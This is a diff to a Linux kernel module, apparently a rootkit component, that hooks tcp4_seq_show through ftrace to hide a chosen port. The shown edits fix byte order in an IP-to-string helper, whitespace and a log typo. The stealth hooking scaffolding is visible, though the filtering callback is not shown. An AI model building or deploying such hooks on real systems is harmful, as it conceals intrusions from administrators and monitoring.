@@ -17,14 +17,14 @@ module_param(port_to_hide, int, 0);
 typedef int (*original_tcp4_seq_show_t)(struct seq_file *seq, void *v);
 static unsigned long tcp4_seq_show_address; 
 static original_tcp4_seq_show_t original_tcp4_seq_ptr;
-static struct ftrace_ops ops = { .func = callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY};
+static struct ftrace_ops ops = { .func = callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY };
 
 char * ipaddr_to_string(__be32 ipaddr)
 {
-    int first = (unsigned char)((ipaddr >> 24) & 0xFF);
-    int second = (unsigned char)((ipaddr >> 16) & 0xFF);
-    int third = (unsigned char)((ipaddr >> 8) & 0xFF);
-    int fourth = (unsigned char)(ipaddr & 0xFF);
+    int first = (unsigned char)(ipaddr & 0xFF);
+    int second = (unsigned char)((ipaddr >> 8) & 0xFF);
+    int third = (unsigned char)((ipaddr >> 16) & 0xFF);
+    int fourth = (unsigned char)((ipaddr >> 24) & 0xFF);
 
     // Maximum length of an ip string in ipv4
     char *buffer = kmalloc(15 * 8, GFP_KERNEL);
@@ -65,7 +65,7 @@ int load(void) {
     printk(KERN_ALERT "Initializing...");
     tcp4_seq_show_address = kallsyms_lookup_name("tcp4_seq_show");
     if (!tcp4_seq_show_address) {
-        printk(KERN_ALERT "Failed to fin tcp4_seq_show!");            
+        printk(KERN_ALERT "Failed to find tcp4_seq_show!");            
         return 0;
     }
 
